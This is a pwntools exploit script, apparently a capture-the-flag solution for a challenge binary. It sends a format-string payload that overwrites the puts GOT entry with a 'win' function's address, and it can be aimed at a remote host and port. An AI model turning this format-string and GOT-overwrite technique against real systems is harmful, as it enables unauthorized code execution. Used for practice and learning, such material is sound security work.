from pwn import *
from sys import argv
from os.path import isfile

target = sys.argv[1]
if not isfile(target):
  print(f'[!] {target}: not found or not a file.')
elf = context.binary = ELF(target, checksec=False)

def start(argv=[], *a, **kw):
  if args.GDB:
    return gdb.debug([target] + argv, gdbscript=gdbscript, *a, **kw)
  elif args.REMOTE:
    if len(argv) != 4:
      print(f'[!] host IP and port not supplied.')
      exit(1)
    return remote(argv[2], argv[3], *a, **kw)
  else:
    return process([target] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

##### settings #####

context.log_level = 'debug'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

##### template ends #####

# ===========================================================
#          EXPLOIT GOES HERE
# ===========================================================
#Arch:       amd64-64-little
#RELRO:      Partial RELRO
#Stack:      No canary found
#NX:         NX enabled
#PIE:        No PIE (0x400000)
#Stripped:   No
p = start()
sa = lambda i,o: p.sendlineafter(i,o)

win_addr = elf.sym['win']
puts_got = elf.got['puts']

sa(b'<You> : ', b'1')
sa(b'<You> : ', b'2')
sa(b'<You> : ', b'53504427')
sa(b'<You> : ', b'2')
sa(b'<You> : ', b'3')
payload = fmtstr_payload(6, {puts_got: win_addr})
sa(b'<You> : ', payload)
# .0xa.0xff.0x2e70252e41414141.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x79e054400070.0x79e054402030.0x7fff168b00f0.0x79e054292571

p.interactive()
